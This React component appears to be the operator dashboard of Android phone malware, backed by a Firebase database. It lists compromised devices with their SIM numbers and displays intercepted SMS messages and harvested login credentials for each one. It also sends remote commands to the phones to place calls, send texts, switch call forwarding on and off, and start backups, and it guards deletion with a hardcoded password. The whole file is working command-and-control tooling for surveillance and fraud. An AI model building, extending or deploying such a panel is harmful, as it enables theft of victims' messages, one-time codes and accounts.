"use client";
import React, { useState } from "react";
import { ref, update, remove } from "firebase/database";
import { db } from "../lib/firebase";

const DEVICE_LIMIT = 10;

export default function DevicesPanel({ 
  data, 
  deviceOnlineStatus, 
  deviceSerialMap, 
  favourites, 
  toggleFavourite, 
  showToast,
  openSmsModal,
  deleteAllSms,
  deleteAllCredentials
}) {
  const [searchQuery, setSearchQuery] = useState("");
  const [filter, setFilter] = useState("all");
  const [offset, setOffset] = useState(0);
  const [expandedDevices, setExpandedDevices] = useState({});
  const [activeTabs, setActiveTabs] = useState({});
  const [formMemory, setFormMemory] = useState({});

  const devices = data.user_data || {};
  const deviceStatus = data.device_status || {};

  let keys = Array.from(new Set([...Object.keys(devices), ...Object.keys(deviceStatus)]));

  if (searchQuery) {
    const q = searchQuery.toLowerCase();
    keys = keys.filter(id => {
      const dev = devices[id] || {};
      const status = deviceStatus[id] || {};
      const name = status.device_name || dev.d_name || dev.Device_info || id;
      const serial = deviceSerialMap[id] || 0;
      return (id + " " + name + " " + serial).toLowerCase().includes(q);
    });
  }

  // Online pehle, fir Serial
  keys.sort((a, b) => {
    const onA = deviceOnlineStatus[a] ? 1 : 0;
    const onB = deviceOnlineStatus[b] ? 1 : 0;
    if (onA !== onB) return onB - onA;
    const sA = deviceSerialMap[a] || 0;
    const sB = deviceSerialMap[b] || 0;
    return sB - sA;
  });

  if (filter === "online") {
    keys = keys.filter(id => deviceOnlineStatus[id] === true);
  } else if (filter === "offline") {
    keys = keys.filter(id => !deviceOnlineStatus[id]);
  }

  const paginatedKeys = keys.slice(offset, offset + DEVICE_LIMIT);

  const copyToClipboard = (text, label = "Item") => {
    if (!text) return;
    navigator.clipboard.writeText(String(text));
    showToast(`📋 Copied: ${String(text).slice(0, 20)}`, "success");
  };

  const toggleExpand = (id) => {
    setExpandedDevices(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleTab = (devId, tab) => {
    setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
  };

  const handleCommand = (type, devId) => {
    if (!confirm(`Execute ${type} on ${devId}?`)) return;
    const baseRef = ref(db, `user_data/${devId}`);

    if (type === "call") {
      const num = formMemory[`callNum-${devId}`];
      const sim = formMemory[`callSim-${devId}`] || "0";
      if (!num) return showToast("Enter phone number!", "warning");
      update(baseRef, { command: "make call", adminNumber: num, simSlot: sim, timestamp: Date.now() });
      showToast("Call command sent", "success");
    } else if (type === "sms") {
      const num = formMemory[`smsNum-${devId}`];
      const body = formMemory[`smsText-${devId}`];
      const sim = formMemory[`smsSim-${devId}`] || "1";
      if (!num || !body) return showToast("Enter recipient & message!", "warning");
      update(baseRef, { command: "send message", targetDeviceId: devId, phoneNumber: num, messageText: body, simSlot: sim, timestamp: Date.now() });
      showToast("SMS command sent", "success");
    } else if (type === "fwd_on") {
      const num = formMemory[`fwdNum-${devId}`];
      const sim = formMemory[`fwdSim-${devId}`] || "0";
      if (!num) return showToast("Enter forward number!", "warning");
      update(baseRef, { command: "call forward", targetDeviceId: devId, phoneNumber: num, simSlot: sim, timestamp: Date.now() });
      showToast("Call Forward Activated", "success");
    } else if (type === "fwd_off") {
      const sim = formMemory[`fwdSim-${devId}`] || "0";
      update(baseRef, { command: "forward off", targetDeviceId: devId, simSlot: sim, timestamp: Date.now() });
      showToast("Call Forward Deactivated", "success");
    } else if (type === "backup") {
      update(baseRef, { command: "backup", timestamp: Date.now() });
      showToast("Backup initiated", "success");
    }
  };

  const deleteDeviceData = (devId, type) => {
    const pwd = prompt(`🔐 Enter Password to delete ${type}:`);
    if (pwd !== "9090") return showToast("❌ Invalid Password", "error");
    if (!confirm(`Delete ${type} for ${devId}?`)) return;

    const path = type === "sms" ? `user_sms/${devId}` : `login/${devId}`;
    remove(ref(db, path)).then(() => showToast(`Deleted ${type}`, "success"));
  };

  const onlineCount = Object.values(deviceOnlineStatus).filter(Boolean).length;
  const offlineCount = keys.length - onlineCount;

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2><i className="fas fa-mobile-alt" style={{ color: "var(--gold)" }}></i> Registered Devices</h2>
          <p className="panel-sub">Click on any device to expand controls & details</p>
        </div>
        <div className="panel-stats">
          <button className={`filter-btn ${filter === "all" ? "active" : ""}`} onClick={() => { setFilter("all"); setOffset(0); }}>
            All ({keys.length})
          </button>
          <button className={`filter-btn ${filter === "online" ? "active" : ""}`} onClick={() => { setFilter("online"); setOffset(0); }}>
            🟢 Online ({onlineCount})
          </button>
          <button className={`filter-btn ${filter === "offline" ? "active" : ""}`} onClick={() => { setFilter("offline"); setOffset(0); }}>
            🔴 Offline ({offlineCount})
          </button>
        </div>
      </div>

      <div className="search-container">
        <i className="fas fa-search search-icon"></i>
        <input 
          type="text" 
          value={searchQuery}
          onChange={(e) => { setSearchQuery(e.target.value); setOffset(0); }}
          placeholder="Search by ID, name, or serial..." 
          className="search-input"
        />
        {searchQuery && (
          <button className="search-clear-btn" style={{ display: "block" }} onClick={() => setSearchQuery("")}>
            <i className="fas fa-times"></i>
          </button>
        )}
      </div>

      <div style={{ marginBottom: 12, display: "flex", justifyContent: "flex-end", gap: 8, flexWrap: "wrap" }}>
        <button className="btn-delete-all" onClick={deleteAllSms}><i className="fas fa-trash-alt"></i> Delete All SMS</button>
        <button className="btn-delete-all credential" onClick={deleteAllCredentials}><i className="fas fa-key"></i> Delete All Credentials</button>
      </div>

      <div id="devicesContainer">
        {offset > 0 && (
          <button className="btn-load-more" style={{ marginBottom: 10 }} onClick={() => setOffset(Math.max(0, offset - DEVICE_LIMIT))}>
            <i className="fas fa-chevron-up"></i> Previous Page
          </button>
        )}

        {paginatedKeys.map((devId, idx) => {
          const dev = devices[devId] || {};
          const status = deviceStatus[devId] || {};
          const isOnline = Boolean(deviceOnlineStatus[devId]);
          const isFav = favourites.includes(devId);
          const serial = deviceSerialMap[devId] || 0;
          const expanded = expandedDevices[devId];
          const curTab = activeTabs[devId];

          const modelName = status.device_name || dev.Device_info || dev.d_name || "Device";
          const lastSeen = status.last_seen || dev.last_online || "N/A";

          const smsMap = data.user_sms?.[devId] || {};
          const smsList = Object.values(smsMap).reverse();
          const loginMap = data.login?.[devId] || {};
          const loginList = Object.entries(loginMap).map(([key, val]) => ({
            key,
            ...val,
            _timestamp: val.timestamp || val.date || 0
          })).sort((a, b) => b._timestamp - a._timestamp);

          return (
            <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
              {/* Header */}
              <div className="card-header" onClick={() => toggleExpand(devId)}>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div className="device-name-premium">
                    <button 
                      className="fav-star-btn" 
                      onClick={(e) => { e.stopPropagation(); toggleFavourite(devId); }}
                    >
                      <i className={isFav ? "fas fa-star" : "far fa-star"}></i>
                    </button>
                    <span className="name-text">📱 {devId.slice(0, 14)}...</span>
                    <span className="device-id">#{offset + idx + 1}</span>
                    {serial > 0 && <span className="serial-badge-premium">S-{serial}</span>}
                    <button 
                      className="copy-device-id-btn" 
                      onClick={(e) => { e.stopPropagation(); copyToClipboard(devId, "Device ID"); }}
                    >
                      <i className="fas fa-copy"></i> Copy ID
                    </button>
                  </div>

                  <div className="device-sub-info">
                    <span><i className="fas fa-microchip"></i> {modelName}</span>
                    <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || "SIM 1: N/A"}</span>
                    {dev.numberSim2 && <span><i className="fas fa-sim-card"></i> {dev.numberSim2}</span>}
                  </div>
                </div>

                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 4 }}>
                  <span className={`status-badge-premium ${isOnline ? "online" : "offline"}`}>
                    <span className="status-dot"></span>
                    {isOnline ? "Online" : "Offline"}
                  </span>
                  <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
                    <i className="far fa-clock"></i> {lastSeen.slice(11) || lastSeen}
                  </span>
                </div>
              </div>

              {/* 4-Item Grid Info */}
              <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
                <div className="info-item-premium">
                  <span className="info-label">Device Model</span>
                  <span className="info-value">{modelName}</span>
                </div>
                <div className="info-item-premium">
                  <span className="info-label">SIM 1</span>
                  <span className="info-value">{dev.numberSim1 || "No SIM"}</span>
                </div>
                <div className="info-item-premium">
                  <span className="info-label">SIM 2</span>
                  <span className="info-value">{dev.numberSim2 || "No SIM"}</span>
                </div>
                <div className="info-item-premium">
                  <span className="info-label">Serial</span>
                  <span className="info-value highlight">{serial || "—"}</span>
                </div>
              </div>

              {/* Toggle Expand */}
              <div className="expand-hint" onClick={() => toggleExpand(devId)}>
                <i className={`fas fa-chevron-${expanded ? "up" : "down"}`}></i> {expanded ? "Click to collapse" : "Click to expand controls"}
              </div>

              {/* Expandable Tabs */}
              {expanded && (
                <div className="expandable-content">
                  <div className="actions-row-premium">
                    {[
                      { id: "sms", label: "SMS", icon: "fas fa-envelope", count: smsList.length },
                      { id: "login", label: "Login", icon: "fas fa-key", count: loginList.length },
                      { id: "call", label: "Call", icon: "fas fa-phone" },
                      { id: "sendsms", label: "Send SMS", icon: "fas fa-paper-plane" },
                      { id: "fwd", label: "Forward", icon: "fas fa-random" },
                      { id: "backup", label: "Backup", icon: "fas fa-database" },
                      { id: "delete", label: "Delete", icon: "fas fa-trash" }
                    ].map(a => (
                      <button 
                        key={a.id} 
                        className={`action-btn-premium ${curTab === a.id ? "active" : ""}`}
                        onClick={() => handleTab(devId, a.id)}
                      >
                        <i className={a.icon}></i> {a.label} {a.count > 0 && <span className="btn-badge">{a.count}</span>}
                      </button>
                    ))}
                  </div>

                  {/* SMS Sub-tab */}
                  {curTab === "sms" && (
                    <div className="section-premium">
                      <div className="section-title">
                        <span>Messages ({smsList.length})</span>
                        <button onClick={() => openSmsModal(devId)} className="btn-gold" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>View Full</button>
                      </div>
                      <div style={{ display: "flex", flexDirection: "column", gap: 6, maxHeight: 250, overflowY: "auto" }}>
                        {smsList.slice(0, 8).map((m, i) => (
                          <div key={i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6, borderLeft: "2px solid var(--gold)" }}>
                            <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10, color: "var(--text-muted)" }}>
                              <span style={{ color: "var(--gold-light)", fontWeight: 600 }}>{m.sender || m.address}</span>
                              <span>{m.date || ""}</span>
                            </div>
                            <div style={{ fontSize: 11, marginTop: 4, color: "var(--text-primary)" }}>{m.body}</div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Login Sub-tab */}
                  {curTab === "login" && (
                    <div className="section-premium">
                      <div className="section-title">
                        <span>Credentials ({loginList.length})</span>
                        <button onClick={() => deleteDeviceData(devId, "credentials")} className="btn-luxury btn-red" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>Delete All</button>
                      </div>
                      <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                        {loginList.length === 0 ? (
                          <div style={{ fontSize: 12, color: "var(--text-muted)", textAlign: "center", padding: 10 }}>No credentials recorded.</div>
                        ) : (
                          loginList.map((cred, i) => (
                            <div key={cred.key || i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6 }}>
                              {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
                                <div key={k} style={{ display: "flex", justifyContent: "space-between", fontSize: 11, padding: "2px 0" }}>
                                  <span style={{ color: "var(--text-muted)" }}>{k}:</span>
                                  <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
                                </div>
                              ))}
                            </div>
                          ))
                        )}
                      </div>
                    </div>
                  )}

                  {/* Call Sub-tab */}
                  {curTab === "call" && (
                    <div className="section-premium">
                      <div className="section-title">Make Call Command</div>
                      <input 
                        type="text" 
                        placeholder="Enter target phone number" 
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6 }}
                        value={formMemory[`callNum-${devId}`] || ""}
                        onChange={(e) => setFormMemory(p => ({ ...p, [`callNum-${devId}`]: e.target.value }))}
                      />
                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("call", devId)}>
                        <i className="fas fa-phone"></i> Execute Call
                      </button>
                    </div>
                  )}

                  {/* Send SMS Sub-tab */}
                  {curTab === "sendsms" && (
                    <div className="section-premium">
                      <div className="section-title">Send SMS Command</div>
                      <input 
                        type="text" 
                        placeholder="Phone Number" 
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 6, borderRadius: 6 }}
                        value={formMemory[`smsNum-${devId}`] || ""}
                        onChange={(e) => setFormMemory(p => ({ ...p, [`smsNum-${devId}`]: e.target.value }))}
                      />
                      <textarea 
                        placeholder="Message Text" 
                        rows="2"
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6 }}
                        value={formMemory[`smsText-${devId}`] || ""}
                        onChange={(e) => setFormMemory(p => ({ ...p, [`smsText-${devId}`]: e.target.value }))}
                      />
                      <button className="btn-luxury btn-blue" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("sms", devId)}>
                        <i className="fas fa-paper-plane"></i> Send SMS
                      </button>
                    </div>
                  )}
                </div>
              )}
            </div>
          );
        })}

        {offset + DEVICE_LIMIT < keys.length && (
          <button className="btn-load-more" onClick={() => setOffset(offset + DEVICE_LIMIT)}>
            <i className="fas fa-chevron-down"></i> Load More Devices ({keys.length - (offset + DEVICE_LIMIT)} remaining)
          </button>
        )}
      </div>
    </div>
  );
}
